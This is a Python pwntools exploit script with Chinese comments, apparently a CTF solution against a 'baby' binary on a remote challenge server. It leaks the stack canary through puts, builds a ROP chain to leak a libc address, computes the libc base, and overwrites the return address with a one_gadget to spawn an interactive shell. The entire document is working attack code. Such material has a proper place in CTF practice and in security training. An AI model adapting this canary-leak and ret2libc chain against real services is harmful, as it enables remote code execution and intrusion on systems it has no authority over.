# -*- coding: utf-8 -*-
from pwn import*

local = 0
if local:  # if else 使用选择本地或者远程
    p = process('./baby')
else:
    p = remote('111.198.29.45', 36749)

elf = ELF('./baby')
libc = ELF('./libc-2.23.so')
read_ = 0xf7220
put_plt = elf.plt['puts']
put_got=elf.got['puts']
main_addr=0x0400908
prdi_addr=0x0400a93
one_gadget_addr = 0x45216# 选择onegadget，要满足寄存器，尽量选择rax=null

def leak():
    # 获取canary的方法，利用puts的读取以\x00，输入字符串连接到canary，输出的时候连同canary一起打印
    p.sendlineafter('>>', '1')
    p.sendline('A'*0x88)
    p.sendlineafter('>>', '2')
    p.recvuntil('A'*0x88 + '\n')  # \n的作用，将端口读到的数据进行换行
    canary=u64(p.recv(7).rjust(8, '\x00'))  # 向左填充字符,在栈中一个地址，后面的x00其实实际是在前面
    print hex(canary)
    return canary

canary = leak()
p.sendlineafter('>> ','1')
payload='a'*0x88+p64(canary)+'a'*8+p64(prdi_addr)+p64(put_got)+p64(put_plt)+p64(main_addr)
p.sendline(payload)
p.recv()
p.sendlineafter('>> ','3')
put_addr=u64(p.recv(8).ljust(8,'\x00'))
print hex(put_addr)
libc_base=put_addr-libc.symbols['puts']
flag=libc_base+one_gadget_addr
p.sendlineafter('>> ','1')
payload1='a'*0x88+p64(canary)+'a'*8+p64(flag)
p.sendline(payload1)
p.sendlineafter('>> ','3')
p.interactive()

#binsh=libcbase+libc.dump(‘str_bin_sh’)
